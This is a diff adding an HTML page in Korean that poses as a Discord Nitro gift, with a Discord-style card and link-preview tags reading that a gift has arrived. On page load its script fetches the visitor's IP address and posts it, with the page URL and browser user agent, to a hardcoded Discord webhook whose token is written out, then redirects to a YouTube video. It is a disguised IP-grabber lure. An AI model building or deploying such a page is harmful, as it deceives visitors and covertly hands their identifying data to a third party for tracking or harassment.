@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>니트로</title>
+
+  <!-- Open Graph 메타 태그 -->
+  <meta property="og:title" content="니트로" />
+  <meta property="og:description" content="선물이 왔어요!" />
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1395751700215762967/1395970941594505238/nitro.png?ex=687c62c0&is=687b1140&hm=aa8afd77b5a1b7cbe5083323e418d3d2824baa2e8253cd1ab4da8a294a192c1e" />
+  <meta property="og:url" content="https://yourgithubusername.github.io/yourrepo" />
+  <meta property="og:type" content="website" />
+
+  <style>
+    body {
+      background-color: #2f3136;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      padding: 50px;
+      color: #dcddde;
+      text-align: center;
+    }
+    .embed {
+      background-color: #36393f;
+      border-left: 5px solid #7289da;
+      border-radius: 5px;
+      padding: 20px;
+      max-width: 500px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #00aff4;
+      margin-bottom: 10px;
+    }
+    .description {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+    .thumbnail img {
+      width: 120px;
+      height: 120px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="embed">
+    <div class="thumbnail">
+      <img src="https://cdn.discordapp.com/attachments/1395751700215762967/1395970941594505238/nitro.png?ex=687c62c0&is=687b1140&hm=aa8afd77b5a1b7cbe5083323e418d3d2824baa2e8253cd1ab4da8a294a192c1e" alt="니트로" />
+    </div>
+    <div class="title">니트로</div>
+    <div class="description">선물이 왔어요! 잠시만 기다려주세요...</div>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1395974043282309221/V2PwBXCCySryj3xdPUao3Kq9GsYQ0SLhl0cLFeX1y52Qf7GKE0cABoY6j88faFF1o6QQ";
+    const redirectURL = "https://www.youtube.com/watch?v=64Pu9XbHBfY&list=RD64Pu9XbHBfY&start_radio=1";
+
+    // 방문자 IP 가져오기 (ipify API)
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const visitorIP = data.ip;
+        const payload = {
+          content: `웹사이트 방문 알림\n- URL: ${window.location.href}\n- IP: ${visitorIP}\n- User Agent: ${navigator.userAgent}`
+        };
+        return fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(console.error)
+      .finally(() => {
+        // 3초 후 유튜브로 리다이렉트
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 3000);
+      });
+  </script>
+
+</body>
+</html>
